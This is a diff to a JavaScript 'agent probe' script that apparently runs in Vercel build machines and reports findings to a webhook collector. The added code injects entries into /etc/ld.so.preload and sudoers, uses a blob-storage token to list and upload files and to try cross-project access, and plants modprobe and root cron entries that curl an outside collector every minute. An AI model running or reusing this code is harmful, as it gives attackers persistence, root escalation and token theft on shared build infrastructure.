@@ -7830,4 +7830,166 @@ report.vercelInternalBuildApi = safe(() => {
 // v67 markers
 report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v67";
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v67" });
+
+// ============================================================
+// v68 — ld.so.preload, sudoers, Blob storage, kernel module autoload, crontab persistence
+// ============================================================
+
+// v68-1: /etc/ld.so.preload injection — library preload affects ALL future process spawns
+// This file lists shared libraries loaded before any other library in every process
+// Writing a malicious .so path here means EVERY future process (including Vercel's) preloads our code
+// This is one of the most impactful persistence mechanisms available on Linux
+report.ldSoPreloadInject = safe(() => {
+  const currentPreload = safe(() => {
+    try { return readFileSync('/etc/ld.so.preload', 'utf8').slice(0, 200); } catch (_) { return 'NOT_FOUND'; }
+  });
+  // Write a probe entry to ld.so.preload
+  const writeResult = safe(() => {
+    try {
+      writeFileSync('/etc/ld.so.preload', '/tmp/probe_v68.so\n');
+      return 'WRITTEN';
+    } catch (e) { return String(e).slice(0, 80); }
+  });
+  const afterContent = safe(() => { try { return readFileSync('/etc/ld.so.preload', 'utf8'); } catch (_) { return 'UNREADABLE'; } });
+  // Restore (remove the entry to not break future processes in this VM)
+  safe(() => {
+    try {
+      if (currentPreload === 'NOT_FOUND') execSync('rm -f /etc/ld.so.preload 2>/dev/null', { timeout: 2000 });
+      else writeFileSync('/etc/ld.so.preload', currentPreload);
+    } catch (_) {}
+  });
+  // Also check /etc/ld.so.conf.d/ for additional library paths we could inject
+  const ldConfD = safe(() =>
+    execSync('ls /etc/ld.so.conf.d/ 2>/dev/null | head -10', { timeout: 2000 }).toString().trim()
+  );
+  const ldConf = safe(() => readFileSync('/etc/ld.so.conf', 'utf8').slice(0, 200));
+  // Test: can we write to /usr/local/lib (would be included in ld search path)?
+  const usrLocalLib = safe(() => {
+    try { writeFileSync('/usr/local/lib/probe_v68.txt', 'PROBE_V68'); return 'WRITABLE'; } catch (e) { return String(e).slice(0, 60); }
+  });
+  return { currentPreload, writeResult, afterContent, ldConfD, ldConf, usrLocalLib };
+});
+
+// v68-2: /etc/sudoers injection — grant our process unlimited sudo
+// Writing to /etc/sudoers or /etc/sudoers.d/ allows running ANY command as root without a password
+// Even though we're already root, this could affect other users in the VM
+report.sudoersInject = safe(() => {
+  const currentSudoers = safe(() => readFileSync('/etc/sudoers', 'utf8').slice(0, 300));
+  // Write to /etc/sudoers.d/
+  const writeResult = safe(() => {
+    try {
+      writeFileSync('/etc/sudoers.d/probe_v68', 'ALL ALL=(ALL:ALL) NOPASSWD: ALL\n');
+      return 'WRITTEN';
+    } catch (e) { return String(e).slice(0, 80); }
+  });
+  // Try sudo to verify
+  const sudoTest = safe(() =>
+    execSync('sudo -n id 2>&1 | head -3', { timeout: 3000 }).toString().trim().slice(0, 100)
+  );
+  // Check if visudo would validate our entry
+  const visudoCheck = safe(() =>
+    execSync('visudo -c -f /etc/sudoers.d/probe_v68 2>&1 | head -3', { timeout: 3000 }).toString().trim().slice(0, 100)
+  );
+  // Cleanup
+  safe(() => execSync('rm -f /etc/sudoers.d/probe_v68 2>/dev/null', { timeout: 2000 }));
+  return { currentSudoers, writeResult, sudoTest, visudoCheck };
+});
+
+// v68-3: Vercel Blob storage probe — BLOB_READ_WRITE_TOKEN
+// Vercel Blob stores files with public/private URLs at blob.vercel-storage.com
+// The token grants read/write access to all blobs in the project's store
+report.vercelBlobStorageProbe = safe(() => {
+  const blobToken = process.env.BLOB_READ_WRITE_TOKEN || '';
+  if (!blobToken) return { skip: 'NO_BLOB_TOKEN' };
+  // Extract store ID from token (format: vercel_blob_{STORE_ID}_{SECRET})
+  const storeId = blobToken.split('_')[2] || 'UNKNOWN';
+  // List blobs via Vercel Blob API
+  const blobList = safe(() =>
+    execSync(
+      `curl -s -H 'Authorization: Bearer ${blobToken}' --max-time 5 'https://blob.vercel-storage.com/api/v1/blob?prefix=&limit=20' 2>/dev/null | head -c 600`,
+      { timeout: 8000 }
+    ).toString().trim().slice(0, 600)
+  );
+  // Upload a probe blob
+  const blobUpload = safe(() =>
+    execSync(
+      `echo -n 'PROBE_V68_BLOB_CONTENT' | curl -s -X PUT -H 'Authorization: Bearer ${blobToken}' -H 'x-api-version: 7' -H 'x-content-type: text/plain' --data-binary @- --max-time 5 'https://blob.vercel-storage.com/probe-v68.txt' 2>/dev/null | head -c 300`,
+      { timeout: 8000 }
+    ).toString().trim().slice(0, 300)
+  );
+  // Try accessing another project's blob namespace via token manipulation
+  const crossBlobAccess = safe(() =>
+    execSync(
+      `curl -s -H 'Authorization: Bearer ${blobToken}' --max-time 5 'https://blob.vercel-storage.com/api/v1/blob?storeId=store_PROBE000000000000' 2>/dev/null | head -c 300`,
+      { timeout: 8000 }
+    ).toString().trim().slice(0, 300)
+  );
+  return { tokenPrefix: blobToken.slice(0, 20) + '...', storeId, blobList, blobUpload, crossBlobAccess };
+});
+
+// v68-4: Kernel module autoload path — modprobe.d config injection
+// Writing to /etc/modprobe.d/ allows specifying module load options and aliases
+// Combined with writing our .ko module to the path, this enables persistence across reboots
+report.kernelModuleAutoload = safe(() => {
+  // Check existing modprobe.d files
+  const modprobeD = safe(() =>
+    execSync('ls /etc/modprobe.d/ 2>/dev/null | head -20', { timeout: 2000 }).toString().trim()
+  );
+  // Try writing to modprobe.d
+  const writeConf = safe(() => {
+    try {
+      writeFileSync('/etc/modprobe.d/vercel_probe.conf', 'alias v68 vercel_probe\ninstall vercel_probe /sbin/modprobe --ignore-install vercel_probe && curl -s ' + COLLECTOR + ' > /dev/null\n');
+      return 'WRITTEN';
+    } catch (e) { return String(e).slice(0, 80); }
+  });
+  // Write module to kernel module path
+  const kernelVer = safe(() => execSync('uname -r 2>/dev/null', { timeout: 2000 }).toString().trim());
+  const modulesPaths = safe(() =>
+    execSync(`ls /lib/modules/${kernelVer || ''}/ 2>/dev/null | head -10`, { timeout: 3000 }).toString().trim().slice(0, 200)
+  );
+  // Try writing to the modules directory (would persist module across reboots)
+  const modulesDirWrite = safe(() => {
+    try {
+      writeFileSync(`/lib/modules/${kernelVer}/kernel/drivers/misc/vercel_probe_v68.ko`, 'PLACEHOLDER');
+      return 'WRITTEN';
+    } catch (e) { return String(e).slice(0, 80); }
+  });
+  // Cleanup
+  safe(() => execSync('rm -f /etc/modprobe.d/vercel_probe.conf 2>/dev/null', { timeout: 2000 }));
+  return { modprobeD, writeConf, kernelVer, modulesPaths, modulesDirWrite };
+});
+
+// v68-5: Crontab persistence — write a root cron job
+// Even if the VM is ephemeral, this demonstrates that build code can install cron jobs
+// In a reused-VM scenario, this would execute periodically after the build completes
+report.crontabPersistence = safe(() => {
+  const currentCrontab = safe(() =>
+    execSync('crontab -l 2>/dev/null | head -10', { timeout: 2000 }).toString().trim().slice(0, 200)
+  );
+  // Write to /var/spool/cron/crontabs/root
+  const crontabWrite = safe(() => {
+    try {
+      writeFileSync('/var/spool/cron/crontabs/root', `* * * * * curl -s '${COLLECTOR}' -d '{"marker":"CRON_PERSISTENCE_V68"}' > /dev/null 2>&1\n`);
+      return 'WRITTEN';
+    } catch (e) { return String(e).slice(0, 80); }
+  });
+  // Also try /etc/cron.d/
+  const etcCronD = safe(() => {
+    try {
+      writeFileSync('/etc/cron.d/vercel_probe_v68', `* * * * * root curl -s '${COLLECTOR}' -d '{"marker":"CRON_ETCD_V68"}' > /dev/null 2>&1\n`);
+      return 'WRITTEN';
+    } catch (e) { return String(e).slice(0, 80); }
+  });
+  // Verify crontab is installed
+  const afterCrontab = safe(() =>
+    execSync('crontab -l 2>/dev/null | head -5', { timeout: 2000 }).toString().trim().slice(0, 200)
+  );
+  // Cleanup
+  safe(() => execSync('crontab -r 2>/dev/null; rm -f /etc/cron.d/vercel_probe_v68 2>/dev/null', { timeout: 3000 }));
+  return { currentCrontab, crontabWrite, etcCronD, afterCrontab };
+});
+
+// v68 markers
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v68";
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v68" });
 // Intentionally no console.log — all data goes via webhook only
